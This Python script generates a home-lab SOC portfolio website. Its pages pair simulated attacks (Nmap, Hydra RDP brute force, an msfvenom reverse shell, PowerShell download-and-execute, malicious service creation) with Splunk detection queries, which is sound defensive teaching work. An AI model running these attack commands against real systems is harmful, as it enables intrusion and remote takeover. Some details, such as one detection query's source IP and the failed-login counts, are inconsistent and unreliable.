import os

workspace_dir = r"c:\Users\user\OneDrive\Desktop\homesoc_sysmon"
os.makedirs(workspace_dir, exist_ok=True)

css = '''
:root {
    --bg-main: #0B0F19;
    --bg-card: #151A28;
    --accent-primary: #00FF9D;
    --accent-secondary: #00D2FF;
    --text-main: #E2E8F0;
    --text-muted: #94A3B8;
    --border-color: #232B3E;
    --font-heading: 'Inter', sans-serif;
    --font-mono: 'Fira Code', monospace;
}
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}
body {
    background-color: var(--bg-main);
    color: var(--text-main);
    font-family: var(--font-heading);
    line-height: 1.6;
}
nav {
    background: var(--bg-card);
    border-bottom: 1px solid var(--border-color);
    padding: 1rem 2rem;
    position: sticky;
    top: 0;
    z-index: 100;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 1rem;
}
nav a {
    color: var(--text-muted);
    text-decoration: none;
    margin-right: 1rem;
    font-weight: 500;
    font-size: 0.9rem;
    transition: all 0.3s ease;
    padding: 0.4rem 0.8rem;
    border-radius: 4px;
}
nav a:hover, nav a.active {
    color: var(--bg-main);
    background: var(--accent-primary);
    box-shadow: 0 0 15px rgba(0, 255, 157, 0.4);
}
.logo {
    font-weight: 700;
    font-size: 1.4rem;
    color: var(--text-main);
    display: flex;
    align-items: center;
    gap: 0.5rem;
    letter-spacing: 1px;
}
.logo span {
    color: var(--accent-primary);
}
.container {
    max-width: 1000px;
    margin: 3rem auto;
    padding: 0 2rem;
}
.header {
    margin-bottom: 3rem;
    border-bottom: 1px solid var(--border-color);
    padding-bottom: 2rem;
}
.header h1 {
    font-size: 2.8rem;
    margin-bottom: 1rem;
    background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    letter-spacing: -1px;
}
.meta {
    display: flex;
    flex-wrap: wrap;
    gap: 1.5rem;
    color: var(--text-muted);
    font-size: 0.9rem;
    margin-top: 1rem;
    background: rgba(0, 0, 0, 0.2);
    padding: 1rem;
    border-radius: 8px;
    border: 1px solid var(--border-color);
}
.meta-item {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}
.meta-item strong {
    color: var(--accent-secondary);
}
.card {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 2rem;
    margin-bottom: 2rem;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    position: relative;
    overflow: hidden;
}
.card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 4px;
    height: 100%;
    background: var(--accent-primary);
    opacity: 0;
    transition: opacity 0.3s ease;
}
.card:hover::before {
    opacity: 1;
}
.card:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 30px rgba(0, 255, 157, 0.1);
    border-color: rgba(0, 255, 157, 0.3);
}
.card h2 {
    color: #fff;
    margin-bottom: 1.5rem;
    font-size: 1.5rem;
    display: flex;
    align-items: center;
    gap: 0.75rem;
}
.card h2::before {
    content: '';
    display: inline-block;
    width: 12px;
    height: 12px;
    background: var(--accent-secondary);
    border-radius: 50%;
    box-shadow: 0 0 10px var(--accent-secondary);
}
.grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 1.5rem;
    margin-bottom: 1.5rem;
}
.stat-box {
    background: rgba(0, 0, 0, 0.3);
    border: 1px solid var(--border-color);
    padding: 1.25rem;
    border-radius: 8px;
    border-left: 3px solid var(--accent-primary);
    transition: all 0.2s;
}
.stat-box.red { border-left-color: #ff3366; }
.stat-box.purple { border-left-color: #b000ff; }
.stat-box.orange { border-left-color: #ff8800; }
.stat-box .label {
    font-size: 0.8rem;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 0.5rem;
}
.stat-box .val {
    font-family: var(--font-mono);
    font-size: 1.1rem;
    color: var(--text-main);
    word-break: break-all;
}
pre {
    background: #090B10;
    padding: 1.5rem;
    border-radius: 8px;
    overflow-x: auto;
    border: 1px solid var(--border-color);
    font-family: var(--font-mono);
    font-size: 0.9rem;
    color: #A6ACCD;
    margin: 1rem 0;
    box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
}
code.spl {
    color: var(--accent-primary);
}
.placeholder-img {
    width: 100%;
    height: 350px;
    background: rgba(0, 255, 157, 0.03);
    border: 2px dashed rgba(0, 255, 157, 0.2);
    border-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    color: var(--accent-primary);
    font-family: var(--font-mono);
    margin: 1.5rem 0;
    cursor: pointer;
    transition: all 0.3s;
    text-align: center;
}
.placeholder-img svg {
    width: 48px;
    height: 48px;
    margin-bottom: 1rem;
    opacity: 0.5;
}
.placeholder-img:hover {
    background: rgba(0, 255, 157, 0.08);
    border-color: var(--accent-primary);
}
.tag {
    display: inline-block;
    padding: 0.2rem 0.6rem;
    background: rgba(0, 255, 157, 0.1);
    color: var(--accent-primary);
    border-radius: 4px;
    font-size: 0.8rem;
    font-weight: 600;
    margin-right: 0.5rem;
    margin-bottom: 0.5rem;
    border: 1px solid rgba(0, 255, 157, 0.2);
}
.mitre-tag {
    background: rgba(0, 210, 255, 0.1);
    color: var(--accent-secondary);
    border-color: rgba(0, 210, 255, 0.2);
}
li { margin-bottom: 0.5rem; margin-left: 1.5rem; }
p { margin-bottom: 1rem; }
table {
    width: 100%;
    border-collapse: collapse;
    margin: 1.5rem 0;
}
th, td {
    padding: 1rem;
    text-align: left;
    border-bottom: 1px solid var(--border-color);
}
th {
    background: rgba(0,0,0,0.2);
    color: var(--text-main);
    font-weight: 600;
}
td { color: var(--text-muted); }
'''

def get_html(filename, title, desc, meta, content):
    nav_links = [
        ('index.html', 'Home'),
        ('attack1.html', 'Attack 1: Nmap'),
        ('attack2.html', 'Attack 2: Brute Force'),
        ('attack3.html', 'Attack 3: Exploitation'),
        ('attack4.html', 'Attack 4: PowerShell LotL'),
        ('attack5.html', 'Attack 5: PrivEsc'),
        ('dashboard.html', 'Dashboards')
    ]
    
    links_html = ''
    for href, text in nav_links:
        active = ' class="active"' if href == filename else ''
        links_html += f'<a href="{href}"{active}>{text}</a>\n            '

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title} | HomeSOC Portfolio</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        {css}
    </style>
</head>
<body>
    <nav>
        <div class="logo">Home<span>SOC</span> Lab</div>
        <div class="links">
            {links_html}
        </div>
    </nav>
    <div class="container">
        <div class="header">
            <h1>{title}</h1>
            <p style="color: var(--text-muted); font-size: 1.15rem; margin-bottom: 0.5rem;">{desc}</p>
            {meta}
        </div>
        {content}
    </div>
</body>
</html>'''

pages = {}

# INDEX PAGE
pages['index.html'] = get_html('index.html', 'HomeSOC Lab Portfolio', 'Comprehensive Cybersecurity Homelab & Incident Response Project',
'''<div class="meta">
    <div class="meta-item"><strong>Author:</strong> Pelumi Emmanuel</div>
    <div class="meta-item"><strong>Phase:</strong> Complete Lifecycle</div>
    <div class="meta-item"><strong>Date:</strong> April 2026</div>
</div>''',
'''
<div class="card">
    <h2>Project Overview</h2>
    <p>Welcome to my HomeSOC Lab Portfolio. This project showcases the complete lifecycle of a realistic cyber attack against a Windows ecosystem, simulated using a custom VirtualBox homelab environment. By analyzing these multi-stage attacks, I built a robust pipeline for collecting, aggregating, and analyzing security events using Sysmon, Splunk, and Wireshark.</p>
    <div class="grid" style="grid-template-columns: repeat(3, 1fr);">
        <div class="stat-box">
            <div class="label">Total Attacks Simulated</div>
            <div class="val">5 Master Phases</div>
        </div>
        <div class="stat-box purple">
            <div class="label">SIEM Platform</div>
            <div class="val">Splunk Enterprise</div>
        </div>
        <div class="stat-box orange">
            <div class="label">Telemetry Base</div>
            <div class="val">Sysmon (SwiftOnSecurity)</div>
        </div>
    </div>
</div>

<div class="card">
    <h2>Lab Architecture & Topology</h2>
    <p>The lab is completely isolated using a Host-Only adapter to ensure safe execution of malware and exploit payloads, while mirroring an enterprise endpoint detection setup.</p>
    <ul>
        <li><strong>Host Machine:</strong> Running Splunk Enterprise & Wireshark. IP: <code>192.168.56.1</code></li>
        <li><strong>Victim VM:</strong> Windows 11 with Sysmon & Splunk Universal Forwarder. IP: <code>192.168.56.101</code></li>
        <li><strong>Attacker VM:</strong> Kali Linux. IP: <code>192.168.56.104</code></li>
        <li><strong>Network:</strong> VirtualBox Host-Only Adapter (Subnet <code>192.168.56.0/24</code>) with Promiscuous Mode = Allow All.</li>
    </ul>
    
    <div class="placeholder-img" title="[Replace with Lab Architecture Diagram]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4"></path></svg>
        <div>Drop Lab Topology Diagram Here</div>
        <div style="font-size:0.8rem; margin-top:0.5rem; color:var(--text-muted)">architecture_diagram.jpg/.png</div>
    </div>
</div>

<div class="card">
    <h2>The Attack Narrative</h2>
    <p>The security assessment was executed in five distinct phases representing the Cyber Kill Chain:</p>
    <div style="display: flex; flex-direction: column; gap: 1rem; margin-top: 1.5rem;">
        <a href="attack1.html" style="text-decoration:none;">
            <div class="stat-box" style="border-left-color: var(--accent-secondary); transition: all 0.2s;">
                <div class="val" style="color:var(--accent-secondary);">Phase 1: Reconnaissance (Nmap)</div>
                <div class="label" style="margin-top:0.5rem;">Aggressive port scanning leading to network intelligence gathering.</div>
            </div>
        </a>
        <a href="attack2.html" style="text-decoration:none;">
            <div class="stat-box" style="border-left-color: #ff3366; transition: all 0.2s;">
                <div class="val" style="color:#ff3366;">Phase 2: Initial Access (Brute Force)</div>
                <div class="label" style="margin-top:0.5rem;">Hydra-driven dictionary attack against the Remote Desktop Protocol (RDP).</div>
            </div>
        </a>
        <a href="attack3.html" style="text-decoration:none;">
            <div class="stat-box" style="border-left-color: #b000ff; transition: all 0.2s;">
                <div class="val" style="color:#b000ff;">Phase 3: Exploitation & C2</div>
                <div class="label" style="margin-top:0.5rem;">Meterpreter reverse TCP shell execution allowing full remote compromise.</div>
            </div>
        </a>
        <a href="attack4.html" style="text-decoration:none;">
            <div class="stat-box" style="border-left-color: #ff8800; transition: all 0.2s;">
                <div class="val" style="color:#ff8800;">Phase 4: Execution (Living off the Land)</div>
                <div class="label" style="margin-top:0.5rem;">PowerShell fileless execution using DownloadString for system enumeration.</div>
            </div>
        </a>
        <a href="attack5.html" style="text-decoration:none;">
            <div class="stat-box" style="border-left-color: #ff3333; transition: all 0.2s;">
                <div class="val" style="color:#ff3333;">Phase 5: Privilege Escalation</div>
                <div class="label" style="margin-top:0.5rem;">Token impersonation and malicious system service creation.</div>
            </div>
        </a>
    </div>
</div>
''')

# ATTACK 1
pages['attack1.html'] = get_html('attack1.html', 'Attack 1: Nmap Reconnaissance', 'Active Scanning & Port Discovery',
'''<div class="meta">
    <div class="meta-item"><strong>Report ID:</strong> HSOC-001</div>
    <div class="meta-item"><strong>Tactic:</strong> Reconnaissance</div>
    <div class="meta-item"><strong>MITRE ATT&CK:</strong> <span class="tag mitre-tag">T1595</span> Active Scanning</div>
</div>''',
'''
<div class="card">
    <h2>Attack Overview</h2>
    <p>The objective of this phase was to simulate a realistic reconnaissance attack using Nmap from the Kali Linux VM against the Windows 11 victim VM. We then captured this behavior natively at the packet level with Wireshark and the kernel level with Sysmon logs ingested into Splunk.</p>

    <div class="grid">
        <div class="stat-box red">
            <div class="label">Attacker (Kali VM)</div>
            <div class="val">192.168.56.104</div>
        </div>
        <div class="stat-box">
            <div class="label">Target (Windows 11)</div>
            <div class="val">192.168.56.101</div>
        </div>
    </div>
</div>

<div class="card">
    <h2>Execution Details</h2>
    <p>Using Kali Linux, an aggressive port scan was initiated with host discovery disabled to mimic stealth-focused, rapid port enumeration over the top 1000 ports.</p>
    <pre><code class="spl">sudo nmap -Pn -sS -T3 -p 1-1000 --open 192.168.56.101</code></pre>
    
    <div class="placeholder-img" title="[Replace with Nmap Output Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
        <div>Drop Nmap Output Screenshot Here</div>
    </div>

    <p>Simultaneously, Wireshark was running on the Host machine capturing traffic over the Host-Only adapter, saved as <code>phase1_nmap_scan.pcap</code>, showcasing the flood of SYN packets directly to the victim.</p>
</div>

<div class="card">
    <h2>SIEM Detection & Splunk SPL</h2>
    <p>Sysmon logs uniquely detect inbound network connections if configured properly (such as using SwiftOnSecurity's XML configuration with Splunk). This detection logic targets sources hitting multiple destination ports rapidly.</p>
    
    <pre><code class="spl">index=homesoc_sysmon EventCode=3 
| stats dc(DestinationPort) as unique_ports, values(DestinationPort) as ports_touched 
    by Source_Network_Address, DestinationIp 
| where unique_ports > 10 
| sort - unique_ports</code></pre>

    <div class="placeholder-img" title="[Replace with Splunk Detection Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
        <div>Drop Splunk Search Result Here</div>
    </div>
    
    <h3>Key Indicators of Compromise (IOCs)</h3>
    <ul>
        <li><strong>Sysmon EventCode:</strong> 3 (Network Connection)</li>
        <li><strong>Source IP:</strong> 192.168.56.104</li>
        <li><strong>Threshold trigger:</strong> Over 10 unique port connections in a short time frame.</li>
    </ul>
</div>
''')

# ATTACK 2
pages['attack2.html'] = get_html('attack2.html', 'Attack 2: Brute Force', 'Credential Access via RDP',
'''<div class="meta">
    <div class="meta-item"><strong>Report ID:</strong> HSOC-002</div>
    <div class="meta-item"><strong>Tactic:</strong> Credential Access</div>
    <div class="meta-item"><strong>MITRE ATT&CK:</strong> <span class="tag mitre-tag">T1110.001</span> Password Guessing</div>
</div>''',
'''
<div class="card">
    <h2>Attack Overview</h2>
    <p>Following reconnaissance, the Remote Desktop Protocol (RDP) on Port 3389 was targeted. A brute force attack was simulated using Hydra, leveraging the rockyou.txt wordlist against the local Administrator account to gain access.</p>

    <div class="grid">
        <div class="stat-box red">
            <div class="label">Tool Used</div>
            <div class="val">Hydra</div>
        </div>
        <div class="stat-box orange">
            <div class="label">Target Service</div>
            <div class="val">TCP / 3389 (RDP)</div>
        </div>
    </div>
</div>

<div class="card">
    <h2>Execution Details</h2>
    <p>Hydra was configured to run a fast dictionary attack against the RDP service, generating thousands of failed login attempts over several minutes.</p>
    <pre><code class="spl">hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.56.101 rdp -t 4</code></pre>
    
    <div class="placeholder-img" title="[Replace with Hydra Attack Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
        <div>Drop Hydra Execution Screenshot Here</div>
    </div>
</div>

<div class="card">
    <h2>SIEM Detection & Splunk SPL</h2>
    <p>Instead of relying purely on Sysmon, this attack creates immense noise in the native Windows Security Event Logs. EventCode 4625 denotes a failed login. We look for a high threshold of failed attempts from a single source address.</p>
    
    <pre><code class="spl">index=homesoc_sysmon EventCode=4625 
| stats count as failed_attempts by SourceNetworkAddress, TargetUserName 
| where failed_attempts > 8 
| sort - failed_attempts</code></pre>

    <div class="placeholder-img" title="[Replace with Splunk EventCode 4625 Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path></svg>
        <div>Drop Splunk Failed Logins Screen Here</div>
    </div>
    
    <h3>Analyst Notes</h3>
    <p>No successful login occurred during the simulation. A rapid succession of failed attempts (EventCode 4625) without an authenticating success clearly flags automated behavior. In production, this highlights the necessity for <strong>Account Lockout Policies</strong> and strict <strong>RDP access restrictions</strong>.</p>
</div>
''')

# ATTACK 3
pages['attack3.html'] = get_html('attack3.html', 'Attack 3: Exploitation & C2', 'Establishing a Meterpreter Reverse Shell',
'''<div class="meta">
    <div class="meta-item"><strong>Report ID:</strong> HSOC-003</div>
    <div class="meta-item"><strong>Tactic:</strong> Execution / C2</div>
    <div class="meta-item"><strong>MITRE ATT&CK:</strong> <span class="tag mitre-tag">T1059.001</span> Windows Shell <span class="tag mitre-tag">T1071</span> Application Layer Protocol</div>
</div>''',
'''
<div class="card">
    <h2>Attack Overview</h2>
    <p>To simulate initial compromise bypassing external controls, a malicious executable payload was synthesized using the Metasploit Framework. Upon execution on the Windows VM, it called back to the attacker, providing an interactive Meterpreter C2 session.</p>

    <div class="grid">
        <div class="stat-box red">
            <div class="label">Payload Framework</div>
            <div class="val">msfvenom</div>
        </div>
        <div class="stat-box purple">
            <div class="label">Listener</div>
            <div class="val">multi/handler (Port 4444)</div>
        </div>
    </div>
</div>

<div class="card">
    <h2>Execution Details</h2>
    <p>The payload was created using <code>msfvenom</code> and a listener arrayed in Metasploit. Once executed manually on the Windows machine, the reverse TCP mapped back successfully.</p>
    <pre><code class="spl">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe -o payload.exe</code></pre>
    
    <div class="placeholder-img" title="[Replace with Meterpreter Shell Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
        <div>Drop Meterpreter C2 Connected Screen Here</div>
    </div>
</div>

<div class="card">
    <h2>SIEM Detection & Splunk SPL</h2>
    <p>This phase is detectable via a combination of two significant Sysmon EventCodes: <strong>Process Creation (1)</strong> followed by an <strong>Outbound Network Connection (3)</strong> from a non-browser executable.</p>
    
    <h3>1. Detecting Suspicious Process Creation</h3>
    <pre><code class="spl">index=homesoc_sysmon EventCode=1 Image=*payload.exe*</code></pre>

    <h3>2. Detecting Outbound C2 Traffic</h3>
    <pre><code class="spl">index=homesoc_sysmon EventCode=3 SourceIp=192.168.56.104 DestinationPort=4444</code></pre>

    <div class="placeholder-img" title="[Replace with Splunk Detection Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
        <div>Drop Splunk Correlation Screen Here</div>
    </div>
    
    <h3>Analyst Notes</h3>
    <p>The combination of a process creation event intimately followed by an outbound connection on an ephemeral or unusual port is a hallmark indicator of a reverse shell. Application whitelisting (AppLocker / WDAC) fundamentally mitigates this vector.</p>
</div>
''')

# ATTACK 4
pages['attack4.html'] = get_html('attack4.html', 'Attack 4: PowerShell Living-off-the-Land', 'Fileless Execution & Recon',
'''<div class="meta">
    <div class="meta-item"><strong>Report ID:</strong> HSOC-004</div>
    <div class="meta-item"><strong>Tactic:</strong> Execution / Defense Evasion</div>
    <div class="meta-item"><strong>MITRE ATT&CK:</strong> <span class="tag mitre-tag">T1059.001</span> PowerShell <span class="tag mitre-tag">T1105</span> Ingress Transfer</div>
</div>''',
'''
<div class="card">
    <h2>Attack Overview</h2>
    <p>To simulate advanced, evasive threat actors, a "Living-off-the-Land" (LotL) approach was utilized. Utilizing the native PowerShell engine, a script was downloaded and executed entirely in memory without dropping traditional binaries to the disk.</p>

    <div class="grid">
        <div class="stat-box red">
            <div class="label">Native Tool</div>
            <div class="val">powershell.exe</div>
        </div>
        <div class="stat-box orange">
            <div class="label">Execution Method</div>
            <div class="val">DownloadString + IEX</div>
        </div>
    </div>
</div>

<div class="card">
    <h2>Execution Details</h2>
    <p>A Python HTTP server was spun up on the Kali attacking machine to host the malicious script. The victim machine was forced to execute an in-memory load.</p>
    <pre><code class="spl">powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/script.ps1')"</code></pre>
    
    <div class="placeholder-img" title="[Replace with PowerShell Execution Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path></svg>
        <div>Drop PowerShell Execution Screen Here</div>
    </div>
</div>

<div class="card">
    <h2>SIEM Detection & Splunk SPL</h2>
    <p>Sysmon process tracking (EventCode 1) logs detailed command-line arguments, explicitly catching the <code>DownloadString</code> payload execution context bypassing Execution Policy.</p>
    
    <pre><code class="spl">index=homesoc_sysmon EventCode=1 
| search CommandLine="*DownloadString*" OR CommandLine="*Invoke-Expression*" OR CommandLine="*IEX*"</code></pre>

    <p>Additionally, hunting for <code>powershell.exe</code> making outbound network requests via EventCode 3 corroborates the payload retrieval.</p>
    
    <div class="placeholder-img" title="[Replace with Splunk PowerShell Detection Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
        <div>Drop Splunk PowerShell Block Screen Here</div>
    </div>
</div>
''')

# ATTACK 5
pages['attack5.html'] = get_html('attack5.html', 'Attack 5: Privilege Escalation & Lateral Movement', 'SYSTEM Authority & C2 Dominance',
'''<div class="meta">
    <div class="meta-item"><strong>Report ID:</strong> HSOC-005</div>
    <div class="meta-item"><strong>Tactic:</strong> Privilege Escalation</div>
    <div class="meta-item"><strong>MITRE ATT&CK:</strong> <span class="tag mitre-tag">T1068</span> Privilege Escalation <span class="tag mitre-tag">T1543.003</span> Windows Service</div>
</div>''',
'''
<div class="card">
    <h2>Attack Overview</h2>
    <p>Expanding the foothold from the previous Meterpreter session, efforts were focused on escalating from a standard user constraint to the overarching <code>NT AUTHORITY\\SYSTEM</code> privilege context utilizing service manipulation.</p>

    <div class="grid">
        <div class="stat-box red">
            <div class="label">Exploit Vector</div>
            <div class="val">Service Creation (sc.exe)</div>
        </div>
        <div class="stat-box purple">
            <div class="label">Obj. Privileges</div>
            <div class="val">SeDebugPrivilege</div>
        </div>
    </div>
</div>

<div class="card">
    <h2>Execution Details</h2>
    <p>Inside the Meterpreter console, the attacker verified local privileges and invoked native Windows utilities (<code>sc create</code>) to install a malicious binary operating as a SYSTEM service.</p>
    <pre><code class="spl">meterpreter > getuid
meterpreter > shell
    C:\\> sc create MaliciousService binPath= "C:\\payload.exe" start= auto
    C:\\> sc start MaliciousService</code></pre>
    
    <div class="placeholder-img" title="[Replace with Metasploit / sc create Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"></path></svg>
        <div>Drop Meterpreter PrivEsc Screen Here</div>
    </div>
</div>

<div class="card">
    <h2>SIEM Detection & Splunk SPL</h2>
    <p>These mechanics are highly indicative of compromise. Creating a service requires execution of <code>sc.exe</code>, which Sysmon catches robustly under EventCode 1.</p>
    
    <pre><code class="spl">index=homesoc_sysmon EventCode=1 
| search Image=*sc.exe* OR CommandLine=*sc create* OR CommandLine=*sc start*
| table _time, Image, CommandLine, User</code></pre>

    <p>Secondary tracing involves identifying unusual parent-child process chains, such as Meterpreter spawning a child <code>cmd.exe</code> which subsequently calls <code>sc.exe</code>.</p>
    
    <div class="placeholder-img" title="[Replace with Splunk SC Detection Screenshot]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>
        <div>Drop Splunk Parent-Child SC Detection Screen Here</div>
    </div>
</div>
''')

# DASHBOARD
pages['dashboard.html'] = get_html('dashboard.html', 'SOC Operational Dashboards', 'Threat Monitoring & Attack Analysis Visualization',
'''<div class="meta">
    <div class="meta-item"><strong>Platform:</strong> Splunk Enterprise Dashboard Studio</div>
    <div class="meta-item"><strong>Visibility:</strong> High-Level & Advanced Analytics</div>
</div>''',
'''
<div class="card">
    <h2>1. SOC Threat Monitoring & Activity Analysis</h2>
    <p>This primary operations dashboard provides a holistic overview of Windows endpoint events, aggregating metrics natively from Sysmon and Windows SecLogs. It establishes an active situational awareness interface.</p>

    <div class="grid" style="grid-template-columns: repeat(4, 1fr);">
        <div class="stat-box">
            <div class="label">Total Endpoint Events</div>
            <div class="val">33,575</div>
        </div>
        <div class="stat-box red">
            <div class="label">Brute Force Attempts</div>
            <div class="val">32</div>
        </div>
        <div class="stat-box purple">
            <div class="label">Auth Success</div>
            <div class="val">4,245</div>
        </div>
        <div class="stat-box orange">
            <div class="label">Top Malicious IP</div>
            <div class="val">192.168.56.104</div>
        </div>
    </div>
    
    <div class="placeholder-img" title="[Replace with SOC_Threat_Monitoring_&_Activity_Analysis_Dashboard.jpg]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
        <div>Embed: SOC_Threat_Monitoring_&_Activity_Analysis_Dashboard.jpg</div>
    </div>
    <ul>
        <li><strong>Security Event Activity Over Time:</strong> A timechart rendering the spike in volume explicitly surrounding April 9th, aligning visually with the executed attacks.</li>
    </ul>
</div>

<div class="card">
    <h2>2. Advanced SOC Threat Detection Analytics</h2>
    <p>This specialized secondary dashboard shifts from event aggregation to active anomaly detection. Utilizing custom statistical metrics to unearth sophisticated threats, such as lateral movement and compromise verification.</p>
    
    <div class="placeholder-img" title="[Replace with Advanced_SOC_Threat_Detection_&_Attack_Analysis_Dashboard.jpg]">
        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
        <div>Embed: Advanced_SOC_Threat_Detection_&_Attack_Analysis_Dashboard.jpg</div>
    </div>

    <h3>Highlighted Components & SPL Logic</h3>
    <ul>
        <li><strong>Suspicious IPs Table:</strong> Flags <code>192.168.56.104</code> generating 32 failed attempts.</li>
        <li><strong>Suspicious Success After Failures:</strong> Explicit correlation identifying when an IP generates significant failures followed by a contiguous success — the true footprint of a Brute Force compromise.</li>
        <li><strong>Target Accounts:</strong> Identifies users under fire (testuser, Pelumi, WIN11$).</li>
    </ul>
</div>
''')

for filename, html_content in pages.items():
    path = os.path.join(workspace_dir, filename)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(html_content)
    print(f"Created {filename}")
